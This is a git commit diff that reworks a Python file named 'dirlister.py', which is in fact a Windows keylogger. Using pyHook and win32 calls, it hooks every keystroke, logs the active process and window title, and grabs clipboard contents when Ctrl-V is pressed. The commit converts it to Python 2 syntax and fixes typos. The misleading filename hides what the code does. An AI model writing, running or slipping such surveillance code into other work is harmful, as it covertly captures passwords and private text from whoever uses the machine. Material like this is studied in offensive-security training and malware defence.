28c6864610dacfa4cae3359dd28053fd7f034993
keptom <33152167+keptom@users.noreply.github.com>
2017-11-07 06:50:09 -0800

    Update dirlister.py

--- dirlister.py
+++ dirlister.py
@@ -1,70 +1,75 @@
 from ctypes import *
 import pythoncom
-import pyHook
+import pyHook 
 import win32clipboard
 
-user32 = windll.user32
+user32   = windll.user32
 kernel32 = windll.kernel32
-psapi = windll.psapi
+psapi    = windll.psapi
 current_window = None
 
 def get_current_process():
-	# get a handle to the foreground window
-	hwnd = user32.GetForegroundWindow()
 
-	# find the process id
-	pid = c_ulong(0)
-	user32.GetWindowThreadProcessId(hwnd, byref(pid))
+    # get a handle to the foreground window
+    hwnd = user32.GetForegroundWindow()
 
-	# store the current process id
-	process_id = pid.value
+    # find the process ID
+    pid = c_ulong(0)
+    user32.GetWindowThreadProcessId(hwnd, byref(pid))
 
-	# grab the executable
-	executable = create_string_buffer("\x00" * 512) # 0x00 == NULL
-	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
+    # store the current process ID
+    process_id = "%d" % pid.value
 
-	psapi.GetModuleBaseName(h_process, None, byref(executable), 512)
+    # grab the executable
+    executable = create_string_buffer("\x00" * 512)
+    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
 
-	# read the title
-	window_title = create_string_buffer("\x00" * 512)
-	lenght = user32.GetWindowTextA(hwnd, bref(window_title), 512)
+    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
 
-	# print out the header if we're in the right process
-	print("\n[PID: {0} - {1} - {2}").format(process_id, executable.value, window.title_value)
+    # now read it's title
+    window_title = create_string_buffer("\x00" * 512)
+    length = user32.GetWindowTextA(hwnd, byref(window_title),512)
 
-	# close the handles
-	kernel32.CloseHandle(hwnd)
-	kernel32.CloseHandle(h_process)
+    # print out the header if we're in the right process
+    print
+    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
+    print
+  
 
-def key_stroke(event):
-	global current_window
+    # close handles
+    kernel32.CloseHandle(hwnd)
+    kernel32.CloseHandle(h_process)
+    
+def KeyStroke(event):
 
-	# check if target changed windows
-	if event.WindowName != current_window:
-		current_window = event.WindowName
-		get_current_process()
+    global current_window   
 
-	# if a standart key is pressed
-	if event.Ascii in range(32, 128):
-		print(chr(event.Ascii))
-	else:
-		# if [Ctrl-V] was pressed
-		if event.Key == "V":
-			win32clipboard.OpenClipboard()
-			pasted_value = win32clipboard.GetClipboardData()
-			win32clipboard.CloseClipboard()
+    # check to see if target changed windows
+    if event.WindowName != current_window:
+        current_window = event.WindowName        
+        get_current_process()
 
-			print("[PASTE] - {0}".format(pasted_value))
-		else:
-			print ("{0}".format(event.Key))
+    # if they pressed a standard key
+    if event.Ascii > 32 and event.Ascii < 127:
+        print chr(event.Ascii),
+    else:
+        # if [Ctrl-V], get the value on the clipboard
+        # added by Dan Frisch 2014
+        if event.Key == "V":
+            win32clipboard.OpenClipboard()
+            pasted_value = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            print "[PASTE] - %s" % (pasted_value),
+        else:
+            print "[%s]" % event.Key,
 
-	# pass execution to the next registered hook
-	return True
+    # pass execution to next hook registered 
+    return True
 
-# create and register a hook manager
-kl = pyHook.HookManager()
-kl.KeyDown = key_stroke
+# create and register a hook manager 
+kl         = pyHook.HookManager()
+kl.KeyDown = KeyStroke
 
-# register and loop hook
+# register the hook and execute forever
 kl.HookKeyboard()
 pythoncom.PumpMessages()
